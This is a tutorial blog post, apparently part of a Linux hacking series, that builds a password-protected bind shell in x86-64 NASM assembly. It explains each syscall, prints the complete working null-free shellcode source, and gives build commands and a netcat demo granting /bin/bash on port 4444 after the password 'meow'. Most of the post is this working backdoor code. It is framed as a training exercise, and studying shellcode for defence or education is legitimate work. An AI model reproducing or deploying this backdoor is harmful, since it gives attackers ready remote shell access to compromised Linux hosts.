---
title:  "Linux hacking part 8: Linux password-protected bind shell. Simple NASM example"
date:   2025-11-14 02:00:00 +0200
header:
  teaser: "/assets/images/184/2025-11-14_09-56.png"
categories:
  - linux
tags:
  - red team
  - linux
  - malware
  - assembly
  - shellcode
---

﷽

Hello, cybersecurity enthusiasts and white hackers!        

![malware](/assets/images/184/2025-11-14_09-56.png){:class="img-responsive"}    

This post is based on an exercise for my students and readers.    

Today, we're diving into the world of low-level programming to create a simple yet effective bindshell for Linux x86-64 using the NASM assembly.    

### practical example

This shellcode won't just open a port and wait; it will also prompt for a password to authenticate. If the wrong password is provided, the connection will be terminated immediately. This is an excellent hands-on exercise for learning about Linux syscalls, socket programming, and stack manipulation.     

First, we need to create a socket. A socket is an endpoint for sending or receiving data. We use the socket syscall for this. On Linux x86-64, the syscall number for socket is `0x29` (`41`). We need to pass three arguments: the domain (`AF_INET`), the type (`SOCK_STREAM`), and the protocol (`0`).

We clear the `rsi` and `rdx` registers using `xor rsi, rsi` and `mul rsi`. Then, we place `0x29` into `al` (the lowest byte of the `rax` register). For the arguments, we set `rdi` to `2` (`AF_INET` for IPv4) and `rsi` to `1` (`SOCK_STREAM` for TCP). After the syscall, the file descriptor for the new socket will be returned in `rax`.    

```nasm
; create socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
xor     rsi, rsi           ; clear rsi register, used for protocol (IPPROTO_IP = 0)
mul     rsi                ; multiply rsi by rsi, setting rdx and rax to 0 (clearing them)
add     al, 0x29           ; set al to 0x29, the syscall number for socket() (in linux)
inc     rsi                ; set rsi = 0x1 (SOCK_STREAM)
push    rsi                ; push rsi onto the stack, which is the second argument (SOCK_STREAM)
pop     rdi                ; pop it into rdi, which is the first argument (address family: AF_INET)
inc     rdi                ; set rdi = 0x2 (AF_INET), the address family
syscall                    ; make the syscall (socket()) to create a socket
```

Now that we have a socket, we need to bind it to an address and port so clients know where to connect. We will use port `4444`. For this, we use the bind syscall, which has the number `0x31` (`49`).    

First, we move the socket file descriptor from `rax` to `rdi`, as `rdi` is used for the first argument of a syscall. We then build the `sockaddr_in` structure directly on the stack. This structure includes the address family (`AF_INET`), the port (`4444` in big-endian, which is `0x5c11`), and the `IP` address (`INADDR_ANY`, or `0`). A pointer to this structure on the stack (`rsp`) is passed to `rsi`.    

```nasm
; bind the socket to port 4444
xchg    rdi, rax           ; exchange rdi (sockfd) with rax (socket file descriptor) from the previous syscall
xor     rax, rax           ; clear rax register (preparing for the bind syscall)
add     al, 0x31           ; set al to 0x31, the syscall number for bind()
push    rdx                ; push 0x0 (padding for sockaddr_in structure)
push    dx                 ; push another 0x0 (padding for sockaddr_in structure)
push    dx                 ; push 0x0 for the ip address (INADDR_ANY)
push    word 0x5c11        ; push the port 4444 (0x5c11) in big-endian format
inc     rdx                ; increment rdx
inc     rdx                ; increment rdx
push    dx                 ; push the address family (AF_INET = 2)
add     dl, 0x0e           ; set dl to 0x0e (size of sockaddr_in structure)
mov     rsi, rsp           ; move rsp (pointer to sockaddr_in structure) to rsi
syscall                    ; make the syscall (bind()) to bind the socket to port 4444
```

After binding the socket, we put it into listening mode so it can accept incoming connections. This is done with the listen syscall (number `0x32`). It requires two arguments: the socket file descriptor (already in `rdi`) and the backlog size, which we will set to `0`.    

```nasm
; listen for incoming connections
xor     rax, rax           ; clear rax
add     al, 0x32           ; set al to 0x32, the syscall number for listen()
xor     rsi, rsi           ; clear rsi (backlog = 0)
syscall                    ; make the syscall (listen()) to start listening for connections
```

Our socket is now ready to accept connections. We use the accept syscall (number `0x2b`), which blocks execution until a client connects. Once a connection is established, accept returns a new file descriptor for that specific connection.    

```nasm
; accept incoming connections
xor     rax, rax           ; clear rax
push    rax                ; push 0 onto the stack for padding
push    rax                ; push another 0 for padding
pop     rdx                ; pop the first 0 (client fd) into rdx
pop     rsi                ; pop the second 0 (client fd) into rsi
add     al, 0x2b           ; set al to 0x2b, syscall number for accept()
syscall                    ; make the syscall (accept()) to accept an incoming client connection
```

A key step is to redirect the standard input (`stdin`), output (`stdout`), and error (`stderr`) streams to the client's socket. This will allow us to interact with the shell over the network connection. We use the `dup2` syscall (number `0x21`) in a loop three times for file descriptors `0`, `1`, and `2`.    

```nasm
; duplicate file descriptors (stdin, stdout, stderr) to client socket
xchg    rdi, rax           ; swap rdi (client socket fd) with rax (fd from accept)
xor     rsi, rsi           ; clear rsi
add     dl, 0x03           ; set dl to 3 (for stdin, stdout, stderr)
.dup_loop:
    xor     rax, rax           ; clear rax
    add     al, 0x21           ; set al to 0x21 (syscall number for dup2())
    syscall                    ; make the syscall (dup2()) to redirect stdin
    inc     rsi                ; increment rsi (move to the next file descriptor)
    cmp     rsi, rdx           ; if rsi == rdx (all 3 descriptors done), exit loop
    jne     .dup_loop          ; otherwise, repeat for the next file descriptor
```

It's time to ask for the password. We send the string `"password?\n"` to the client. This is done using the write syscall (number `1`). We construct the string on the stack, place a pointer to it in `rsi`, put the file descriptor (`stdout`, which now points to the socket) in `rdi`, and the string length in `rdx`.     

```nasm
.prompt:
    ; print "password?\n"
    xor     rdi, rdi           ; clear rdi
    mul     rdi                ; multiply (does nothing, just clears rdx)
    push    rdi                ; push 0 onto the stack
    pop     rsi                ; pop the pointer to the "password?" string into rsi

    mov     rsi, 0x0000000000000a3f    ; "\n?" (question mark and newline)
    push    rsi                ; push the first part of the string (newline + question mark)
    mov     rsi, 0x64726f7773736170    ; "password" in little-endian
    push    rsi                ; push the second part of the string ("password")
    mov     rsi, rsp           ; set rsi to point to the string (password?\n)
    inc     rax                ; increment rax (syscall number for write)
    mov     rdi, rax           ; move rax to rdi (file descriptor: stdout)
    mov     dl, 10             ; set dl to 10 (string length)
    syscall                    ; make the syscall (write) to send the string to stdout
```

Next, we read the user's input using the read syscall (number `0`). We expect to receive `4 bytes` - the length of our password, `meow`.     

```nasm
; read the 4-byte password input
xor     rdi, rdi           ; clear rdi (file descriptor = 0 for stdin)
push    rdi                ; push 0 onto the stack
mul     rdi                ; multiply (does nothing here, just clears rdx)
mov     rsi, rsp           ; rsi points to the buffer for the password
add     rdx, 0x04          ; set rdx to 4 (password length)
syscall                    ; make the syscall (read) to get user input
```

Now for the most important part: checking the password. We compare the `4` bytes of input with our string `meow` (stored as `0x776f656d` in little-endian). The `repe cmpsb` instruction is perfect for this, as it compares bytes pointed to by `rdi` and `rsi`.    

If the passwords match, we jump to the `.welcome` label. If not, the program continues execution, which leads to the exit syscall (number `0x3c`), and the connection is terminated.

```nasm
; compare input to "meow"
mov     rdi, rsp           ; rdi points to the user input
mov     rsi, 0x776f656d     ; "meow" in little-endian
push    rsi                ; push "meow" onto the stack
mov     rsi, rsp           ; rsi points to the stored "meow" string
xor     rcx, rcx           ; clear rcx (length counter)
mov     cl, 0x04           ; set cl to 4 (password length)
repe cmpsb                 ; compare the input with "meow"
jz      .welcome           ; if they match, jump to welcome message

; exit if password incorrect
mov     al, 0x3c           ; set al to 60, the syscall number for exit()
xor     rdi, rdi           ; clear rdi
inc     rdi                ; set rdi to 1 (error code)
syscall                    ; make the syscall (exit)
```

If the password is correct, we send a "welcome\n" message.     

```nasm
.welcome:
; print "welcome\n" to the client
...
```

Finally, after a successful authentication, we give the user a shell. We use the execve syscall (number `0x3b`) for this, which replaces the current process with a new one. We execute `/bin/bash`. The string `/bin/bash` is also built on the stack.    

```nasm
; execve("/bin/bash", NULL, NULL) - spawn the shell
xor     rsi, rsi           ; clear rsi (null for argv[])
mul     rsi                ; multiply (clears rdx)
xor     rdi, rdi           ; clear rdi (null for envp[])
push    rdi                ; push 0 onto the stack
mov     dl, 0x68           ; 'h' character in little-endian
push    rdx                ; push the 'h' character onto the stack
mov     rdx, 0x7361622f6e69622f ; "/bin/bash" in little-endian
push    rdx                ; push "/bin/bash" onto the stack
xor     rdx, rdx           ; clear rdx (null for execve arguments)
mov     rdi, rsp           ; rdi points to the "/bin/bash" string
mov     al, 0x3b           ; set al to 0x3b, syscall number for execve
syscall                    ; make the syscall (execve) to start the shell
```

That's it! We've built a fully functional bindshell with password protection.     

So, finally, full source code looks like this `hack.asm`:     

```nasm
; linux/x64 null-free bindshell 
; with password "meow"
; exits on wrong password
; author: @cocomelonc for DEF CON training

section .text
    global _start              ; make _start label visible for the linker, entry point for the program

_start:
    ; create socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    xor     rsi, rsi           ; clear rsi register, used for protocol (IPPROTO_IP = 0)
    mul     rsi                ; multiply rsi by rsi, setting rdx and rax to 0 (clearing them)
    add     al, 0x29           ; set al to 0x29, the syscall number for socket() (in linux)
    inc     rsi                ; set rsi = 0x1 (SOCK_STREAM)
    push    rsi                ; push rsi onto the stack, which is the second argument (SOCK_STREAM)
    pop     rdi                ; pop it into rdi, which is the first argument (address family: AF_INET)
    inc     rdi                ; set rdi = 0x2 (AF_INET), the address family
    syscall                    ; make the syscall (socket()) to create a socket

    ; bind the socket to port 4444
    xchg    rdi, rax           ; exchange rdi (sockfd) with rax (socket file descriptor) from the previous syscall
    xor     rax, rax           ; clear rax register (preparing for the bind syscall)
    add     al, 0x31           ; set al to 0x31, the syscall number for bind()
    push    rdx                ; push 0x0 (padding for sockaddr_in structure)
    push    dx                 ; push another 0x0 (padding for sockaddr_in structure)
    push    dx                 ; push 0x0 for the ip address (INADDR_ANY)
    push    word 0x5c11        ; push the port 4444 (0x5c11) in big-endian format
    inc     rdx                ; increment rdx
    inc     rdx                ; increment rdx
    push    dx                 ; push the address family (AF_INET = 2)
    add     dl, 0x0e           ; set dl to 0x0e (size of sockaddr_in structure)
    mov     rsi, rsp           ; move rsp (pointer to sockaddr_in structure) to rsi
    syscall                    ; make the syscall (bind()) to bind the socket to port 4444

    ; listen for incoming connections
    xor     rax, rax           ; clear rax
    add     al, 0x32           ; set al to 0x32, the syscall number for listen()
    xor     rsi, rsi           ; clear rsi (backlog = 0)
    syscall                    ; make the syscall (listen()) to start listening for connections

    ; accept incoming connections
    xor     rax, rax           ; clear rax
    push    rax                ; push 0 onto the stack for padding
    push    rax                ; push another 0 for padding
    pop     rdx                ; pop the first 0 (client fd) into rdx
    pop     rsi                ; pop the second 0 (client fd) into rsi
    add     al, 0x2b           ; set al to 0x2b, syscall number for accept()
    syscall                    ; make the syscall (accept()) to accept an incoming client connection

    ; duplicate file descriptors (stdin, stdout, stderr) to client socket
    xchg    rdi, rax           ; swap rdi (client socket fd) with rax (fd from accept)
    xor     rsi, rsi           ; clear rsi
    add     dl, 0x03           ; set dl to 3 (for stdin, stdout, stderr)
.dup_loop:
    xor     rax, rax           ; clear rax
    add     al, 0x21           ; set al to 0x21 (syscall number for dup2())
    syscall                    ; make the syscall (dup2()) to redirect stdin
    inc     rsi                ; increment rsi (move to the next file descriptor)
    cmp     rsi, rdx           ; if rsi == rdx (all 3 descriptors done), exit loop
    jne     .dup_loop          ; otherwise, repeat for the next file descriptor

.prompt:
    ; print "password?\n"
    xor     rdi, rdi           ; clear rdi
    mul     rdi                ; multiply (does nothing, just clears rdx)
    push    rdi                ; push 0 onto the stack
    pop     rsi                ; pop the pointer to the "password?" string into rsi

    mov     rsi, 0x0000000000000a3f    ; "\n?" (question mark and newline)
    push    rsi                ; push the first part of the string (newline + question mark)
    mov     rsi, 0x64726f7773736170    ; "password" in little-endian
    push    rsi                ; push the second part of the string ("password")
    mov     rsi, rsp           ; set rsi to point to the string (password?\n)
    inc     rax                ; increment rax (syscall number for write)
    mov     rdi, rax           ; move rax to rdi (file descriptor: stdout)
    mov     dl, 10             ; set dl to 10 (string length)
    syscall                    ; make the syscall (write) to send the string to stdout

    ; read the 4-byte password input
    xor     rdi, rdi           ; clear rdi (file descriptor = 0 for stdin)
    push    rdi                ; push 0 onto the stack
    mul     rdi                ; multiply (does nothing here, just clears rdx)
    mov     rsi, rsp           ; rsi points to the buffer for the password
    add     rdx, 0x04          ; set rdx to 4 (password length)
    syscall                    ; make the syscall (read) to get user input

    ; compare input to "meow"
    mov     rdi, rsp           ; rdi points to the user input
    mov     rsi, 0x776f656d     ; "meow" in little-endian
    push    rsi                ; push "meow" onto the stack
    mov     rsi, rsp           ; rsi points to the stored "meow" string
    xor     rcx, rcx           ; clear rcx (length counter)
    mov     cl, 0x04           ; set cl to 4 (password length)
    repe cmpsb                 ; compare the input with "meow"
    jz      .welcome           ; if they match, jump to welcome message

    ; exit if password incorrect
    mov     al, 0x3c           ; set al to 60, the syscall number for exit()
    xor     rdi, rdi           ; clear rdi
    inc     rdi                ; set rdi to 1 (error code)
    syscall                    ; make the syscall (exit)

.welcome:
    ; print "welcome\n" to the client
    xor     rdi, rdi           ; clear rdi
    mul     rdi                ; multiply (clears rdx)
    push    rdi                ; push 0 onto the stack
    pop     rsi                ; rsi points to the "welcome" string
    mov     rsi, 0x0a656d6f636c6577 ; "welcome\n" in little-endian
    push    rsi                ; push "welcome\n" onto the stack
    mov     rsi, rsp           ; rsi points to the "welcome\n" string
    inc     rax                ; increment rax for syscall number (1 for write)
    mov     rdi, rax           ; move rax to rdi (file descriptor: stdout)
    mov     dl, 8              ; set dl to 8 (length of "welcome\n")
    syscall                    ; make the syscall (write) to send the message to the client

    ; execve("/bin/bash", NULL, NULL) - spawn the shell
    xor     rsi, rsi           ; clear rsi (null for argv[])
    mul     rsi                ; multiply (clears rdx)
    xor     rdi, rdi           ; clear rdi (null for envp[])
    push    rdi                ; push 0 onto the stack
    mov     dl, 0x68           ; 'h' character in little-endian
    push    rdx                ; push the 'h' character onto the stack
    mov     rdx, 0x7361622f6e69622f ; "/bin/bash" in little-endian
    push    rdx                ; push "/bin/bash" onto the stack
    xor     rdx, rdx           ; clear rdx (null for execve arguments)
    mov     rdi, rsp           ; rdi points to the "/bin/bash" string
    mov     al, 0x3b           ; set al to 0x3b, syscall number for execve
    syscall                    ; make the syscall (execve) to start the shell
```

### demo

Let's go to see everything in action, compile and run our code:    

```bash
nasm -f elf64 -o hack.o hack.asm
```

![malware](/assets/images/184/2025-11-14_09-51.png){:class="img-responsive"}    

Then link the object file with `ld`:    

```bash
ld -o hack hack.o
```

![malware](/assets/images/184/2025-11-14_09-53.png){:class="img-responsive"}    

Now, run the executable. It will run in the background, waiting for a connection on port `4444`.     

```bash
./hack
```

![malware](/assets/images/184/2025-11-14_10-02.png){:class="img-responsive"}    

Open a new terminal and connect to it using netcat.     

```bash
nc 127.0.0.1 4444
```

![malware](/assets/images/184/2025-11-14_10-02_1.png){:class="img-responsive"}    

First, let's try an incorrect password:     

![malware](/assets/images/184/2025-11-14_09-54.png){:class="img-responsive"}    

As you can see, the connection closed immediately.     

Now, let's try the correct password:     

![malware](/assets/images/184/2025-11-14_09-55_1.png){:class="img-responsive"}    

![malware](/assets/images/184/2025-11-14_09-55.png){:class="img-responsive"}    

As you can see, after entering "meow", we are granted access to a shell. Everything worked as expected! Perfect! =^..^=     

### final words

This exercise is more than just building a tool; it's about peeling back the layers of abstraction to understand *what's really happening on your system*. By writing this bindshell, you've worked directly with the Linux kernel through syscalls, managed memory on the stack, and handled network connections at a fundamental level. You now have a concrete understanding of how shells are spawned and how I/O redirection works under the hood.     

[linux shellcoding examples](/tutorial/2021/10/09/linux-shellcoding-1.html)    
[linux x64 syscall table](https://x64.syscall.sh/)     
[source code in github](https://github.com/cocomelonc/meow/tree/master/2025-11-14-linux-hacking-8)    

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!         
*PS. All drawings and screenshots are mine*       
